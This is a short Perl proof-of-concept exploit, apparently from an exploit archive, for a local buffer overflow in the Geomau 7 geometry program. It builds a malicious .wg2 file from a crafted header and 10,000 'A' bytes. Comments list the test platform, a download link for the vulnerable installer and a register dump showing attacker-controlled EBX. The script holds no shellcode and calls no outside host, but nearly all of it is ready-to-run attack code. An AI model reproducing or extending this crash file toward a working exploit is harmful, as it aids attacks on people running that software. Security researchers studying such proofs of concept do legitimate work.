#!/usr/bin/perl
###################################################################
#Exploit Title : Geomau 7 (.wg2) local Buffer Overflow Poc
#tested on windows xp SP 3 FR
#Author: MadjiX - Dz8[at]HotmaiL[dot]CoM
#download: http://math.exeter.edu/rparris/peanut/wgau32z.exe
#Special Greets:Bibi-info , His0k4 [ where are you :( ]
###################################################################
#EAX 0012F640
#ECX 00BB8F68
#EDX 00004789
#EBX 41414141
#ESP 0012F5F4
#EBP 0012F5F8
#ESI 00000032
#EDI 00000000
#EIP 0058AF23 wgeomau.0058AF23
#C 0 ES 0023 32bit 0(FFFFFFFF)
#P 1 CS 001B 32bit 0(FFFFFFFF)
#A 0 SS 0023 32bit 0(FFFFFFFF)
#Z 0 DS 0023 32bit 0(FFFFFFFF)
#S 0 FS 003B 32bit 7FFDF000(FFF)
#T 0 GS 0000 NULL
###################################################################
my $file = "MadjiX.wg2";

my $hd =
"\x71\x02\x00\x00\x32\x00\x00\x00\x42\x01\x00\x00\x5F\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00".
"\x00\x00\x00\x00\x01\x00\x00\x00\x3D\x00\x00\x00\xD9\xFF\xFF\xFF\x2C\x01\x00\x00\x64\x00\x00\x00".
"\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0A\x00\x00\x00\x0F\x00\x00\x00\x2B\xD0\x28\x01".
"\x49\x1E\x29\x01\x00\x00\x00\x00\x0C\x00\x00\x00\x0A\x00\x00\x00\x0A";

my $junk = "\x41" x 10000 ;
open($FILE,">$file");
print $FILE $hd.$junk;
close($FILE);